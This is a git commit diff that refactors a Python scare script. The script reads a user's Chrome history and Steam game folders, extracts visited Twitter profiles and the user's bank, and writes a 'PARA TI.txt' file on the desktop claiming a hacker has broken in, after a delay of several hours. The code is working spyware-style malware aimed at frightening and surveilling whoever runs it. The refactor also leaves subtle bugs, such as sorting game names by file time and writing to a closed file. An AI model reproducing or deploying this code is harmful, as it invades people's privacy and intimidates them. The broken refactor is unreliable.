bd8d5ec496ee1af85f267cc14837698b9cf77352
utapa <112322786+utapa@users.noreply.github.com>
2023-12-20 18:20:05 -0300

    optimizando  (#1)

--- functions.py
+++ functions.py
@@ -9,38 +9,37 @@ import glob
 
 HACKER_FILE_NAME = "PARA TI.txt"
 
+# Function to get the user's home path
 def get_user_path():
-    return "{}/".format(Path.home())
+    return f"{Path.home()}/"
 
-
+# Function to check recently played Steam games
 def check_steam_games(hacker_file):
     steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
-    games = []
-    game_paths = glob.glob(steam_path)
-    game_paths.sort(key=os.path.getmtime, reverse=True)
-    for game_path in game_paths:
-        games.append(game_path.split("\\")[-1])
-    hacker_file.write("He visto que has estado jugando ultimamente a {}... Jajaja...".format(", ".join(games[:3])))
+    games = [game_path.split("\\")[-1] for game_path in glob.glob(steam_path)]
+    games.sort(key=os.path.getmtime, reverse=True)
+    hacker_file.write(f"He visto que has estado jugando últimamente a {', '.join(games[:3])}... Jajaja...")
 
-
+# Function to introduce a random delay
 def delay_action():
     n_hours = randrange(1, 4)
-    print("Durmiendo {} horas".format(n_hours))
-    sleep(n_hours)  # * 60 * 60)
+    print(f"Durmiendo {n_hours} horas")
+    sleep(n_hours * 60 * 60)
 
-
+# Function to create the hacker file
 def create_hacker_file(user_path):
-    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
-    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.\n")
-    return hacker_file
+    hacker_file_path = f"{user_path}Desktop/{HACKER_FILE_NAME}"
+    with open(hacker_file_path, "w") as hacker_file:
+        hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.\n")
+    return hacker_file_path
 
-
+# Function to get Chrome browser history
 def get_chrome_history(user_path):
     urls = None
     while not urls:
         try:
-            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
-            temp_history = history_path + "temp"
+            history_path = f"{user_path}/AppData/Local/Google/Chrome/User Data/Default/History"
+            temp_history = f"{history_path}temp"
             copyfile(history_path, temp_history)
             connection = sqlite3.connect(temp_history)
             cursor = connection.cursor()
@@ -52,25 +51,16 @@ def get_chrome_history(user_path):
             print("Historial inaccesible, reintentando en 3 segundos...")
             sleep(3)
 
-
+# Function to check Twitter profiles visited and scare the user
 def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
-    profiles_visited = []
-    for item in chrome_history:
-        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
-        if results and results[0] not in ["notifications", "home"]:
-            profiles_visited.append(results[0])
-    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...\n".format(", ".join(profiles_visited)))
+    profiles_visited = [re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])[0]
+                        for item in chrome_history if re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+                        and re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])[0] not in ["notifications", "home"]]
+    hacker_file.write(f"He visto que has estado husmeando en los perfiles de {', '.join(profiles_visited)}...\n")
 
-
+# Function to check the bank mentioned in Chrome history
 def check_bank_account(hacker_file, chrome_history):
-    his_bank = None
     banks = ["BBVA", "CaixaBank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
-    for item in chrome_history:
-        for b in banks:
-            if b.lower() in item[0].lower():
-                his_bank = b
-                break
-        if his_bank:
-            break
-    hacker_file.write("Además veo que guardas el dinero en {}... Interesante...\n".format(his_bank))
-
+    his_bank = next((b for item in chrome_history for b in banks if b.lower() in item[0].lower()), None)
+    if his_bank:
+        hacker_file.write(f"Además veo que guardas el dinero en {his_bank}... Interesante...\n")
